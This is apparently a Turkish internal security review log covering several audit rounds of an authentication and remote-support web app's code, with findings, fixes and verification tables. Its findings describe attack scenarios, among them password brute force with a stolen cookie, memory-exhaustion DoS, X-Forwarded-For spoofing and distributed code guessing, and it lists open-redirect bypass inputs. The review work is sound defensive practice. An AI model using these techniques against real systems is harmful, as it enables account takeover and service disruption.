Öneri: atomik artırım — `UPDATE users SET failed_login_count = IF(failed_window_at > NOW(3) - INTERVAL 1 HOUR, failed_login_count + 1, 1), failed_window_at = IF(...)`
sonra değeri oku (veya TX içinde `SELECT ... FOR UPDATE`). Eşzamanlı 25 isteklik entegrasyon testi. Atanan: backend-dev

#### S1-3 [ORTA] Şifre değişimi diğer oturumları düşürmez; mevcut şifre denemesi sınırsız — A07

Yer: apps/server/src/auth/service.ts:105-118, repo.ts:49-51
Tehdit: (a) çalınmış oturum çerezi kurbanın şifre değişiminden sonra da 8 sa'e kadar geçerli kalır (ASVS 3.3.3);
(b) çerezi ele geçiren saldırgan `/auth/password/change` ile `current`'ı limitsiz dener (her deneme argon2 19 MiB → CPU/bellek DoS),
bulunca şifreyi değiştirip hesabı kalıcı ele geçirir.
Öneri: aynı TX'te `auth_sessions` → `revoked_at = now` (mevcut hariç; tercihen mevcut da yenilenir — yeni token + çerez);
`current` hatalarını hesap+IP sayacına bağla (5 hata → oturumu iptal + 423), audit `auth.password_change fail` zaten var.
Atanan: backend-dev

#### S1-4 [DÜŞÜK] `next=` tam yol + sorgu taşıyor (bilinen not) — A04 / G-10

Yer: apps/web/proxy.ts:10, :34-38
Değerlendirme: P1'de `/session/*` sayfası olmadığından bugün sızıntı yok; Caddy sorgu dizesini (Caddyfile:33) ve `Location`'ı
(:41) siliyor, `Referrer-Policy: no-referrer` var, pino `maskUrl` sorguyu atıyor. Risk P2'de doğar: oturumsuz müşteri
`/session/<token>` açınca `/login?next=%2Fsession%2F<token>`'a gider (akış bozulur + token tarayıcı geçmişi/ekran paylaşımında
ikinci URL'de). Şiddet: Düşük, **P2 giriş şartı**.
Öneri: `PUBLIC_PATHS` önek eşleşmeli (`/login`, `/session/`, ileride `/download`); `next` yalnız panel önekleri için ve sorgusuz
üretilsin; `/session/` hiçbir zaman `next`'e yazılmasın (birim test). Atanan: frontend-dev

#### S1-5 [DÜŞÜK] Hesap kilidiyle kullanıcı numaralandırma — A07

Yer: apps/server/src/auth/service.ts:41-57, :70-74
Tehdit: hesap geneli kilit yalnız var olan kullanıcıda oluşur; ≥4 IP'den 20 hatalı deneme sonrası var olan hesap 423,
olmayan 401 döner. Kilitli hesapta argon2 atlanır (zamanlama farkı ama durum kodu zaten farklı). 401 yolları için dummy argon2 doğru.
Öneri: kilit kararı verilen yanıt (`pairLocked||accountLocked`) yerine hesap geneli kilit bilgisini yalnız sonraki doğru şifrede
göster; ya da var olmayan login için de bellek içi hesap sayacı (login adı anahtarlı) tutarak aynı 423'ü üret. Atanan: backend-dev

#### S1-6 [DÜŞÜK] Hesap+IP kilidi eşzamanlı isteklerle 4 kat aşılır — A07

Yer: apps/server/src/auth/service.ts:69 (`blockedFor`) ↔ :78 (`hit`, argon2'den sonra)
Tehdit: aynı IP'den paralel 20 istek kontrolü birlikte geçer → 15 dk'da 5 yerine ~20 deneme (IP limiti 20/dk ile sınırlı).
Öneri: `hit` doğrulamadan önce sayılsın, başarılı girişte `reset`; veya ikili başına uçuşta-istek kilidi. Atanan: backend-dev

#### S1-7 [DÜŞÜK] Audit izinli listesi alt nesneleri maskesiz bırakır — A09 (G-15)

Yer: apps/server/src/audit/mask.ts:31
Tehdit: izinli anahtarın (`source`, `reason`, `result`, `action`…) değeri nesne ise içi taranmadan yazılır;
ileride `{ source: body }` gibi bir çağrı şifreyi açık loglar.
Öneri: izinli anahtar yalnız ilkel değerlerde açık; nesne/dizi ise `maskValue(inner)` ile özyinele. Birim test. Atanan: backend-dev

#### S1-8 [DÜŞÜK] E-posta/kullanıcı adı belirsizliği — A07

Yer: apps/server/src/auth/repo.ts:30-35 (`findFirst` + `OR`)
Tehdit: kullanıcı adı başka birinin e-postasına eşit olabilir (iki ayrı UQ) → `findFirst` sırası belirsiz; kilit/sayaç yanlış
hesaba yazılır, meşru kullanıcı giremez. P9'da kullanıcı oluşturma geldiğinde istismar edilebilir.
Öneri: contracts'ta username kalıbı `@` içermesin (`^[a-z0-9._-]{3,60}$`); login `@` içeriyorsa yalnız e-posta, değilse yalnız username ara. Atanan: backend-dev

#### S1-9 [DÜŞÜK] Çerezlerde `__Host-` öneki yok — A05

Yer: packages/contracts/src/api/auth.ts:56-57, apps/server/src/auth/routes.ts:17
Tehdit: K1 sonrası alan adında kardeş alt alan adı çerez enjekte edebilir (CSRF çerezini sabitleme). Origin kontrolü
CSRF'i yine engeller; derinlik savunması. Öneri: `__Host-rs_session`, `__Host-rs_csrf` (path=/, secure, Domain yok — zaten öyle);
web `proxy.ts:9` sabiti contracts'tan alınsın (çift tanım var). Atanan: backend-dev, frontend-dev

#### S1-10 [DÜŞÜK] Yeni girişte eski oturum iptal edilmez; çıkışta CSRF çerezi yoksa çerezler temizlenmez — A07

Yer: apps/server/src/auth/routes.ts:31-43
Öneri: login'de gelen geçerli `rs_session` varsa revoke; logout CSRF hatasında da (403) en azından çerezleri sil. Atanan: backend-dev

#### S1-11 [DÜŞÜK] CI'da gitleaks imajı etiketle sabit — A08 (G-18)

Yer: .github/workflows/ci.yml:136 (`ghcr.io/gitleaks/gitleaks:v8.30.1`)
Öneri: `@sha256:<digest>` ile sabitle (Action'lar SHA'lı, imaj da aynı kurala girsin); Dependabot `docker` zaten açık. Atanan: devops

### Otomatik tarama çıktıları

- `pnpm audit --audit-level=moderate`: **1 orta** — `minimatch` (GHSA-g3hv-75wg-m249, 21 yol; eslint/geliştirme zinciri,
  runtime imajına girmez). Öneri: Dependabot PR'ı / `pnpm.overrides`. Kritik/Yüksek yok.
- gitleaks: yerelde kurulu değil, **çalıştırılamadı**; CI'da tüm geçmiş taranıyor (ci.yml:134). Repo'da commit yok.
- semgrep: kurulu değil. Elle `secret|password|token` taraması: gerçek değer yok; `.env.example` yalnız anahtar adları;
  test sabit parolası `.gitleaks.toml` tek dosya istisnasıyla. `.dockerignore` `.env*`, `.git`, `docs`, `deploy`'u dışlıyor.
- `.env` git geçmişi: commit yok; `.gitignore` `.env*`, `*.pem`, `*.key`, `deploy/turn/*.local.conf` kapsıyor.

### G maddeleri (P1'e ait) karşılanma tablosu

| G                              | Durum                   | Kanıt / not                                                                                                                                                                                                                                                                                           |
| ------------------------------ | ----------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| G-10 (Caddy log)               | Karşılandı              | Caddyfile:30-43 sorgu, `/session/***`, Cookie, Authorization, X-Csrf-Token, Referer, Set-Cookie, Location, Sec-WebSocket-Protocol siliniyor; pino `maskUrl` + redact (logger.ts:5-23). Kalan: S1-4                                                                                                    |
| G-11 (XFF / ipKey)             | Karşılandı              | app.ts:76 `trustProxy` = `TRUSTED_PROXY_CIDR`; compose:85 + caddy sabit 172.30.0.2; Caddy `trusted_proxies` yok; prod'da zorunlu (env.ts:29); ip.ts IPv4 /32, IPv6 /64, mapped→v4                                                                                                                     |
| G-15 (mask + DB kullanıcıları) | Karşılandı (P1 kapsamı) | mask.ts izinli+kara liste; grants.sql:18-19 audit_logs yalnız SELECT/INSERT; app init'te yetkisiz (01-users.sh:33); server'da MIGRATE_DATABASE_URL yok; check-app-grants.sh. Tetikleyici + fail-closed P11. Kalan: S1-7                                                                               |
| G-18 (CI)                      | Kısmen                  | Action'lar SHA'lı, `permissions: contents: read`, `--frozen-lockfile`, Dependabot npm/actions/docker. Kalan: S1-11                                                                                                                                                                                    |
| G-19 (CSP/başlıklar)           | Karşılandı              | proxy.ts nonce + `strict-dynamic`, `unsafe-inline` yok, `connect-src wss://host:port`, worker/manifest, COOP/CORP, Referrer no-referrer, Permissions-Policy; helmet aynı politika; HSTS `includeSubDomains` yok; `-Server`, `poweredByHeader:false`; `dangerouslySetInnerHTML`/`style=` kullanımı yok |
| G-20 (gizli değer)             | Karşılandı              | ids.ts 256 bit token, `safeEqual` sabit süreli (özetlenmiş)                                                                                                                                                                                                                                           |
| G-23 (kilit DoS)               | Kısmen                  | Hesap+IP (bellek) + hesap geneli 20/sa (DB) + IP 20/dk tasarıma uygun; bildirim e-postası P10. Kalan: S1-2, S1-5, S1-6                                                                                                                                                                                |

### Tasarımda vaat edilip kodda bulunmayanlar

- Hesap geneli kilit "yarışsız" değil (S1-2). Şifre değişiminde oturum iptali tasarımda açık değil; P10 `logout-all` beklemeden eklenmeli (S1-3).
- `tenantScope` P1'de tanımlı ama kullanan tenant verisi ucu yok (beklenen); AC-69 aracı (test/helpers/tenant-matrix.ts) mevcut — her pakette genişletilmeli.

### Olumlu

- Opak 256 bit oturum, DB'de yalnız SHA-256; mutlak 8 sa + boşta 30 dk; her istekte DB doğrulaması; pasif kullanıcı/tenant anında düşer.
- Çerez `HttpOnly`(oturum) + `Secure` + `SameSite=Strict`; double-submit CSRF + **login dahil** Origin allowlist; CORS eklentisi yok.
- argon2id m=19456 KiB, t=2, p=1 (OWASP); kullanıcı yoksa dummy hash ile eşit maliyet; aynı 401 metni; şifre 12-200.
- `must_change_password` sunucu guard'ında (yalnız me/logout/password-change serbest); seed Super Admin'i zorunlu değişimle oluşturuyor, parolayı ezmiyor, prod'da demo tenant yok.
- Hata zarfı stack/SQL sızdırmıyor; `bodyLimit` 64 KB; env hatası değer yazmıyor.
- Docker: non-root `node`, root sahipli salt okunur dosyalar, `read_only`, `cap_drop: ALL`, `no-new-privileges`, MySQL `internal` ağda yayınsız, `/health|/ready|/metrics` dışarı kapalı, `admin off`.

### Ajan bazında

- backend-dev: S1-2, S1-3, S1-5, S1-6, S1-7, S1-8, S1-9 (sunucu), S1-10
- frontend-dev: S1-1, S1-4, S1-9 (proxy.ts sabiti)
- devops: S1-11, `minimatch` güncellemesi

Öneri (`docs/gereksinimler.md` §9 "Sonra"): S1-5..S1-11. S1-1..S1-3 "Sonra" değil, P2 öncesi düzeltme; S1-4 P2 giriş şartı.

## P1 kod turu — Tur 2

DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 1 / Düşük 3 (yeni). S1-1..S1-11'in 11'i de kapandı.

### S1 doğrulama tablosu

| ID    | Sonuç                  | Kanıt                                                                                                                                                                                                                                                                         |
| ----- | ---------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| S1-1  | Kapandı                | web/lib/api.ts:88-113 kontrol karakteri + `\` (ham ve çözülmüş), herhangi bir yerde `//` reddi, son karar `new URL(next, origin).origin` karşılaştırması; login-form.tsx:45 `window.location.origin` geçiyor. `/\t/x`, `%09`, `/%2F/x` reddediliyor                           |
| S1-2  | Kapandı                | repo.ts:40-53 tek ifadeli koşullu `UPDATE` (satır kilidi altında okuma+yazma) → kayıp güncelleme yok. Yan etki: S2-3                                                                                                                                                          |
| S1-3  | Kapandı (kısmen kabul) | service.ts:115-134 diğer oturumlar aynı TX'te iptal; oturum başına 5 hatalı `current` → oturum iptal + 401, sayım doğrulamadan önce. Token yenilenmemesi: S2-2                                                                                                                |
| S1-4  | Kapandı                | proxy.ts:11-15 önek eşleşmesi; :43 `next` yalnız pathname, `/session/` hiç yazılmıyor. `/session/` yalnız çerez ön elemesini atlıyor, yetki yine sunucuda (layout `getMe`)                                                                                                    |
| S1-5  | Kapandı                | olmayan hesap için `ghostAccount` aynı 20/sa kuralını uyguluyor (service.ts:36, :49, :62); kilitli dalda da argon2. Yan etkiler: S2-1, S2-4                                                                                                                                   |
| S1-6  | Kapandı                | service.ts:75 `hit` await'ten önce, senkron                                                                                                                                                                                                                                   |
| S1-7  | Kapandı                | mask.ts:31 izinli anahtarın nesne/dizi değeri de `maskValue` ile özyineleniyor                                                                                                                                                                                                |
| S1-8  | Kapandı                | repo.ts:31-34 `@` varsa yalnız e-posta, yoksa yalnız username, `findUnique`. Username'de `@` yasağı P9'da contracts'a girmeli (izlenecek)                                                                                                                                     |
| S1-9  | Kapandı                | contracts auth.ts:59-60 `__Host-rs_session`, `__Host-rs_csrf`; Secure, Path=/, Domain yok (routes.ts:17); `clearCookie` aynı özniteliklerle (öneki geçerli siler); proxy.ts sabiti contracts'tan                                                                              |
| S1-10 | Kapandı, gerekçe kabul | routes.ts:39-53 hata durumunda yalnız çerezler temizleniyor, sunucu oturumu iptal edilmiyor. Çapraz siteden gelen yanıttaki SameSite=Strict `Set-Cookie` tarayıcıca uygulanmaz; en kötü sonuç kendi tarayıcıda çıkış. Yeni girişte eski oturum iptal ediliyor (service.ts:94) |
| S1-11 | Kapandı                | ci.yml:136 `gitleaks:v8.30.1@sha256:…`; Dockerfile/compose base imajları digest'li; `minimatch` override sonrası `pnpm audit --audit-level=moderate` → **No known vulnerabilities found** (bu turda yeniden çalıştırıldı)                                                     |

### Yeni bulgular

#### S2-1 [ORTA] Bellek içi sayaçlarda sınır yok ve temizlik her istekte O(n) — A04 (DoS)

Yer: apps/server/src/lib/rate.ts:33-36, :52-55; yeni tüketici service.ts:36 `ghostAccount` (anahtar = saldırganın seçtiği login, ≤190 karakter, 60 dk pencere)
Tehdit: her rastgele login değeri `ghostAccount`'ta ve `pair`'de (`login|ip`) birer kayıt açar. Kayıt sayısı 10.000'i geçince
`sweep` her `hit`'te tüm haritayı dolaşıyor, ancak 60 dk dolmadığı için hiçbir kaydı silemiyor. IP başına 20/dk ile ~9 IP
10.000 eşiğini aşar; ~1.000 IP ile ~1,2 M kayıt (yüzlerce MB) oluşur ve her giriş isteği olay döngüsünü onlarca ms kilitler.
Sonuç: tüm API yavaşlar, bellek dolar (OOM ile yeniden başlama sayaçları da sıfırlar).
Öneri: `FixedWindowCounter`'a `maxEntries` (ör. 50.000; dolunca en eski kayıt atılır — Map ekleme sırası, LRU) ve zamanlı
temizlik (`setInterval` 60 sn, `unref`) ekle; her `hit`'te tam tarama yapılmasın. `ghostAccount` anahtarı `sha256(login)`
olsun (sabit 64 B). Birim test: 100k farklı anahtarda bellek ve `hit` süresi sınırlı kalmalı. Atanan: backend-dev

#### S2-2 [DÜŞÜK] Şifre değişiminde mevcut oturum token'ı yenilenmiyor — A07

Yer: apps/server/src/auth/service.ts:128-134, routes.ts:55-59
Gerekçenin değerlendirmesi: **kısmen kabul.** Saldırganın ayrı bir oturumu varsa (şifreyi bilen ya da başka cihaz) iptal ediliyor,
bu doğru. Ama token çalınmasında (XSS, zararlı yazılım, ileride log/yanlış yapılandırma) saldırgan kurbanla **aynı** oturumu
paylaşır. Kurban "bir şey ters" diye şifresini değiştirdiğinde bu oturum "diğer" sayılmaz, saldırgan 8 sa'e kadar içeride kalır.
OWASP Session Management önerisi kimlik bilgisi değişiminde oturumun yenilenmesidir. P10 `logout-all` kullanıcının bilinçli
eylemine bağlıdır, otomatik koruma değildir. HttpOnly + 30 dk boşta süresi riski sınırladığı için şiddet Düşük.
Öneri: başarılı değişimde aynı TX'te mevcut oturumu da iptal et, `openSession` ile yeni token + CSRF üret ve `setSessionCookies`
çağır (login'deki kod yolu; ~10 satır). Test: değişimden sonra eski çerezle `/auth/me` → 401, yeni çerezle 200. Atanan: backend-dev

#### S2-3 [DÜŞÜK] Hedef hesapta satır kilidi çekişmesi — A04

Yer: apps/server/src/auth/repo.ts:41-51 (UPDATE + gereksiz `SELECT … FOR UPDATE` + UPDATE, audit INSERT aynı TX'te, service.ts:50-58)
Tehdit: çok IP'den tek hesaba eşzamanlı yanlış şifre gönderilince bütün TX'ler aynı `users` satırında sıraya girer. Her TX kısa
sürdüğü için kilitlenme (deadlock) beklenmez: tek satır, tek sıra. Ancak yüksek hacimde Prisma bağlantı havuzu bekleyen TX'lerle
dolup diğer istekleri de geciktirebilir. IP limiti (20/dk) bunu sınırlıyor.
Öneri: `FOR UPDATE` kaldırılsın (UPDATE zaten satırı kilitler; okuma aynı TX'te düz SELECT ile yeterli) veya eşik kontrolü tek
ifadeye alınsın (`locked_until = IF(count+1 >= limit, …)`); audit INSERT kilitten sonra ayrı yazılabilir. Yük testi: tek hesaba
500 eşzamanlı istekte başka bir kullanıcının girişi p95 < 1 sn kalmalı. Atanan: backend-dev

#### S2-4 [DÜŞÜK] Hayalet hesap sayacı yeniden başlatmada sıfırlanıyor (kabul edilen risk) — A07

Yer: service.ts:36 (bellek) ↔ var olan hesapta DB `locked_until`
Değerlendirme: kilit penceresi içinde süreç yeniden başlarsa var olan hesap 423, olmayan hesap 401 döner; hesabın varlığı
anlaşılabilir. Saldırgan yeniden başlatmayı kendisi tetikleyemez; S2-1 düzelmezse OOM ile tetikleyebilir, dolayısıyla S2-1'e
bağlı. ADR-0005 (tek instance, bellek) ile tutarlı. Ayrıca düzeltme gerekmez, S2-1 ile birlikte kapanır. Atanan: —

### Diğer kontroller (yeni açık yok)

- Boş gövdeli JSON ayrıştırıcısı (app.ts:91-95): dolu gövde Fastify'ın prototip zehirlemesine karşı korumalı varsayılan ayrıştırıcısına gidiyor; boş gövde `undefined` → zod `{}`. Sorun yok.
- Kilitli dalda argon2 çalıştırılması, kilitli hesaba istek yağdırıldığında CPU maliyeti getiriyor; IP limiti 20/dk ile sınırlı ve S1-5 için gerekli. Kabul.
- Şifre değişimi sayacı oturum kimliği anahtarlı; boyutu oturum sayısıyla sınırlı.

### Ajan bazında

- backend-dev: S2-1 (P2 öncesi önerilir: P2/P3 aynı `FixedWindowCounter`'ı public uçlarda kullanacak), S2-2, S2-3
- frontend-dev, devops: yeni bulgu yok

Öneri (`docs/gereksinimler.md` §9 "Sonra"): S2-3, S2-4. S2-1, P2'deki public resolve/join limitlerinden önce kapatılmalı. S2-2 küçük iş, P2 ile birlikte yapılmalı.

## P1 kod turu — Tur 3

DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 1 (S3-1, kabul edilen kalan risk). S2-1, S2-2, S2-3 kapandı; S2-4 S2-1 ile birlikte kapandı.

### S2 doğrulama

| ID   | Sonuç   | Kanıt                                                                                                                                                                                                                                                                                                       |
| ---- | ------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| S2-1 | Kapandı | rate.ts:53-71 `hit` O(1), `maxEntries` 50.000, dolunca en eski kayıt atılıyor; `prune` istek yolunda değil, 30 sn'lik `unref`'li zamanlayıcıda (:34-38, :78-81); `onClose`'da durduruluyor (app.ts:86). Anahtarlar `sha256(login)` (service.ts:51, :64, :75), bellek ≈ 50k × sayaç sayısı × ~200 B, sınırlı |
| S2-2 | Kapandı | service.ts:136-138 mevcut dahil tüm oturumlar iptal, yeni oturumun bitişi eskisininkini aşmıyor; routes.ts:57 yeni `__Host-` oturum + CSRF çerezi. web lib/api.ts CSRF'i her istekte çerezden okuyor, frontend tarafında ek iş yok                                                                          |
| S2-3 | Kapandı | repo.ts `bumpAccountFailures` tek `UPDATE` (MySQL tek tablo atamaları soldan sağa güncel değerle); `FOR UPDATE` yok. Eşzamanlı ikinci istek pencereyi 1'den başlatıyor ama `locked_until` korunuyor ve kilit kaydı bir kez yazılıyor; kilit sonrası pencere NULL olduğu için sayaç 1'den başlıyor. Doğru    |
| S2-4 | Kapandı | OOM tetikleyicisi kalktı; restart'ta sıfırlanma ADR-0005 kapsamında kabul                                                                                                                                                                                                                                   |

### S3-1 [DÜŞÜK] Sınır dolunca etkin kilit kaydı atılabilir — kalan risk KABUL EDİLDİ — A07

Yer: apps/server/src/lib/rate.ts:59-62
Değerlendirme: ~170 IP ile 15 dk'da 50.000 yeni hesap+IP anahtarı üretilirse saldırganın kendi kilit kaydı atılabilir ve hesap+IP
sınırı (5/15 dk) aşılır. Bu tek başına kaba kuvvet denemesine kapı açmıyor, çünkü:
(1) var olan hesapta asıl sınır **DB'deki hesap geneli kilit** (20/sa, artık atomik), bellekteki atma bunu etkilemiyor;
(2) IP sayacı (20/dk) ayrı bir örnek ve anahtarı IP; atılması için ~50.000 IP gerekir;
(3) olmayan hesapta (`ghostAccount`) atma yalnız 423/401 tutarlılığını bozar: düşük değerli numaralandırma, büyük trafik ister.
Sonuç: P1 için kabul edilebilir.
En basit iyileştirme (Sonra, ~5 satır): atarken kilidi etkin olan kaydı atlamak. En eskiden başlayarak en çok 32 kayda bak; ilk
`blockedUntil <= now` olanı sil. Hepsi kilitliyse yeni kaydı ekleme ve isteği "kilitli" say (fail-closed); bu yalnız yoğun
saldırı altında devreye girer. Yük testi: sınır doluyken etkin kilit kaydı korunmalı.
**P2/P3 notu:** public resolve/join limitlerinde DB'de bir yedek sınır yok; bu sınıf orada kullanılırsa iyileştirme o paketin
giriş şartı olsun (G-02).
Atanan: backend-dev (Sonra; P2 public limitlerinden önce)

### P1 güvenlik kapanışı

S1 (11) + S2 (4) bulgunun hepsi kapandı veya gerekçesiyle kabul edildi. Açık Kritik/Yüksek yok → P1 güvenlik açısından **GEÇTİ**.
`docs/gereksinimler.md` §9 "Sonra" önerisi: S3-1 (P2 öncesi), S1-8 username `@` yasağı (P9).

## P2 kod turu

DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 6 (+ P3 giriş şartı notu). Düşüklerin hepsi "Sonra" olabilir; S-P2-3 ve
S-P2-5 P3 öncesinde kapanmalı.

### S3-1 doğrulama (P1'den kalan şart)

Kapandı: `apps/server/src/lib/rate.ts:57-68`, kilidi süren kayıt atılmıyor (en çok 32 kayda bakılıyor), hepsi kilitliyse
`hit` true dönüyor (fail-closed). P2 public limitleri aynı sınıfı kullanıyor (`sessions/public.ts:26-31`).

### Bulgular (öncelik sırasıyla)

#### S-P2-1 [DÜŞÜK] Web, müşteri sayfasında resolve yaparken gelen X-Forwarded-For'u olduğu gibi iletiyor; edge ağından taklit edilebilir — A01/A04

Yer: apps/web/app/session/[token]/page.tsx:26, apps/web/lib/server-api.ts:93, deploy/docker-compose.yml:87 (`TRUSTED_PROXY_CIDR 172.30.0.2/31`)
Sorun: Server `.3`'ü (web) güvenilen proxy sayıyor. Web ise gelen `x-forwarded-for` başlığını doğrulamadan iletiyor.
Caddy'den gelen istekte bu sorun değil: Caddy'de `trusted_proxies` yok, istemcinin gönderdiği XFF eziliyor. Ama web:3000'e
edge ağından doğrudan gelen bir istek istediği IP'yi yazabiliyor.
İstismar senaryosu: Caddy'de RCE bulan ya da edge ağına eklenen bir konteyner, `GET http://172.30.0.3:3000/session/<x>`
isteğini her seferinde farklı `X-Forwarded-For` ile atar. (a) Token yolunun 30/dk/IP sınırı fiilen kalkar. Token 256 bit
olduğu için tahmin yine pratik değil. (b) `session.resolve` audit satırlarına (410 durumları) sahte `ip_address` yazılır.
Kod yolu bu sayfadan geçmediği için 8 haneli kodun kaba kuvvetle denenmesine yol açmıyor. `next.config.ts:16` rewrite'ı
(http-proxy `xfwd`) kendi bağlantı adresini sona eklediği için o yol taklit edilemiyor. Ön koşul edge ağının ele
geçirilmesi olduğundan önem Düşük.
Düzeltme (devops): Edge ağında yalnız caddy, web ve server kalmalı; compose'a "edge'e servis eklenmez" yorumu ve runbook
notu eklenmeli. Kesin çözüm (Sonra): Caddy `reverse_proxy web:3000 { header_up X-Edge-Auth {env.EDGE_SHARED_SECRET} }`.
Web, bu başlık eşleşmezse XFF iletmemeli. Alternatif: web yalnız XFF'in son öğesini iletmeli (taklidi tek değere indirir,
tamamen kaldırmaz).

#### S-P2-2 [DÜŞÜK] Web'den yapılan resolve User-Agent iletmiyor; audit'te `user_agent` boş ya da "node" — A09

Yer: apps/web/lib/server-api.ts:88-93; server tarafı apps/server/src/audit/service.ts:29
Sorun: `session.resolve` (fail/410) ve resolve sırasında yapılan `session.expired` kayıtlarındaki `user_agent`, müşterinin
tarayıcısını değil Node fetch'i gösteriyor. Ortak standart §1.1 bu alanı zorunlu tutuyor.
İstismar senaryosu: Yok. Olay incelemesinde müşteri ile saldırganın istemcisi ayırt edilemiyor.
Düzeltme (frontend-dev): `resolveSessionToken`'a `user-agent` parametresi eklenmeli, `h.get("user-agent")` değeri en çok
512 karaktere kesilip iletilmeli. Bu değer yalnız bilgi amaçlı, güven kararlarında kullanılmamalı.

#### S-P2-3 [DÜŞÜK] Global `resolve_failed` sayacı/alarmı (G-02) kodda yok; dağıtık kod denemesi görünmüyor — A09/A04

Yer: apps/server/src/sessions/public.ts:66-73 (başarısız kod yalnız ip/önek sayacına giriyor; metrik ve log yok); vaat:
docs/mimari.md:179, :338, docs/mimari-api.md:87
Sorun: IP/önek limitleri tek kaynağa karşı doğru çalışıyor. Ama çok sayıda önekten gelen saldırı hiçbir yerde
görünmüyor. Hesap şöyle: /56 başına yaklaşık 30 hata / 16 dk. Tek bir IPv6 /48 (256 adet /56, tunnel broker ile ücretsiz)
dakikada yaklaşık 480 deneme yapar. 100 bekleyen oturumda bir denemenin tutma olasılığı 10⁻⁶, yani /48 başına beklenen
süre yaklaşık 35 saat. Bu süre önek sayısıyla doğrusal kısalır.
İstismar senaryosu: Kodu tutturan saldırgan bugün (P2) `tenant.name`, `technician.name` ve `techVerifyCode` bilgilerini
alıyor (public.ts:87-93). Bunlar hedefli telefon dolandırıcılığı için malzeme. Oturumu ele geçirmek P3'teki lobi ve
`admitCode` kapısına bağlı.
Düzeltme (backend-dev, P3 öncesi): Başarısız kod için süreç içi bir sayaç tutulmalı (`resolve_failed_total`, dakikalık
pencere). Eşik (100/dk) aşılınca `warn` log atılmalı (IP yazılmadan, yalnız sayı ve önek sayısı). /metrics P13'te bu
sayaca bağlanmalı. Engelleme yapılmamalı (G-02: global alarm olarak kalır).

#### S-P2-4 [DÜŞÜK] Önek (/24) kilidi CGNAT arkasındaki müşterileri birlikte kilitleyebilir — A04 (tasarımda kabul edilmiş kalan risk)

Yer: apps/server/src/sessions/public.ts:27-28, :63-71; apps/server/src/lib/ip.ts:24-31
Sorun: Mobil operatör CGNAT'larında binlerce abone aynı /24'ü paylaşıyor. Aynı havuzdaki bir kişi dakikada 31 hatalı kod
girerse o önekteki herkesin kod girişi 15 dk 429 alır. Link (token) yolu etkilenmiyor.
İstismar senaryosu: Rakip ya da kötü niyetli biri aynı operatörün mobil verisinden betik çalıştırır, o bölgedeki
müşteriler kodla bağlanamaz.
Düzeltme (backend-dev/frontend-dev, Sonra): 429 ekranında "Size gönderilen bağlantıyı kullanın" yönlendirmesi olmalı
(guest-ui `rate`). S-P2-3'teki sayaç önek bazında 429 sayısını da raporlamalı. Tasarım değişikliği gerekmiyor.

#### S-P2-5 [DÜŞÜK] Staging'de Caddy'nin gerçek istemci IP'sini gördüğü doğrulanmadı (Docker userland-proxy / IPv6) — A05

Yer: deploy/docker-compose.yml (caddy `ports`, edge ağı yalnız IPv4)
Sorun: IPv4'te iptables DNAT kaynak adresi korur. Ancak host IPv6 dinliyorsa ve ağ yalnız IPv4 ise, Docker
`docker-proxy` (userland-proxy) bağlantıyı aktarır ve tüm IPv6 istemciler `172.30.0.1` olarak görünür. Bu durumda tüm
IP/önek limitleri tek bir ortak kovaya düşer: bir kişinin 10 hatası herkesi 15 dk kilitler.
İstismar senaryosu: IPv6 ile bağlanan saldırgan 11 hatalı kod girer, IPv6 ile gelen tüm müşterilerin kod girişi kilitlenir.
Düzeltme (devops, P3 öncesi): Staging'de `docker compose logs caddy` çıktısında `request.remote_ip` alanı gerçek dış IP
olmalı; IPv4 ve IPv6 ayrı ayrı denenmeli. `172.30.0.1` görünüyorsa iki yol var: ya `"userland-proxy": false` ile birlikte
edge ağında IPv6 açılmalı (`enable_ipv6`), ya da yayın yalnız IPv4'e bağlanmalı (`0.0.0.0:4450:4450`). Sonuç runbook'a yazılmalı.

#### S-P2-6 [DÜŞÜK] Token yolundaki her 410 yanıtı bir audit satırı yazıyor; audit şişirilebilir — A04

Yer: apps/server/src/sessions/public.ts:51-53, :82-85
Sorun: Bitmiş bir oturumun linkine sahip olan herkes, her yenilemede `session.resolve/fail` satırı üretiyor. Sınır
30/dk/IP; birden çok IP ile sınırsız.
İstismar senaryosu: Sızmış eski bir link botnet'e verilir, audit tablosu ve ekranı gürültüyle dolar, gerçek olaylar
kaybolur.
Düzeltme (backend-dev, Sonra): Aynı `entity_id` + `reason` için 10 dk içinde tek satır yazılmalı (bellek içi
`FixedWindowCounter` ile). Ya da 410'lar audit yerine yalnız sayaç/log olarak tutulmalı.

#### S-P2-7 [BİLGİ] Küçük sertleştirmeler

- apps/server/src/env.ts:30: `SESSION_REF_KEY` production'da opsiyonel; zorunluluğu yalnız compose sağlıyor. Compose
  dışında çalıştırılırsa sessizce süreç başına rastgele anahtar üretiliyor. `TRUSTED_PROXY_CIDR`'deki `refine` gibi
  production'da zorunlu yapılmalı (backend-dev).
- apps/web/next.config.ts:15-16: `/api` rewrite production'da da açık; Caddy `/api/*`'yi önce yakaladığı için dışarıdan
  ulaşılamıyor, ama gereksiz bir ikinci yol. `NODE_ENV !== "production"` koşuluna bağlanmalı (frontend-dev).
- Kod yolunda süresi geçmiş ama iş tarafından henüz süpürülmemiş bir kod (≤30 sn) 410 döndürüyor ve başarısız sayılmıyor
  (public.ts:77-80). Etkisi ihmal edilebilir; yalnız kayda geçsin.

### P3 giriş şartları (bu turdan doğan)

1. `sessionRef` süresiz geçerli ve tarayıcı JS'inde/sorgu dizesinde duruyor. P3/P6'da `GET /public/agent/download?ref=`
   dosya adına kodu (`Destek-<kod>.exe`) yazacağı için ref kodla eşdeğer bir gizli değer olur. Bu uç da kod yolu gibi
   limitlenmeli ve yalnız PENDING durumda yanıt vermeli.
2. P3 join/admit: tüketim `UPDATE ... WHERE status='PENDING' AND expires_at > now` tek ifadede yapılmalı, iptal/expiry
   ile yarışta tek kazanan olmalı (P2'deki kalıp, repo.ts:86-101, doğru ve örnek alınmalı).
3. Agent (P6) public resolve'da `Origin` göndermek zorunda (routes.ts:61). Agent için ayrı ve belgelenmiş bir Origin
   değeri ya da `clientKind=AGENT` için Origin muafiyeti kararı verilmeli.

### Otomatik tarama çıktıları

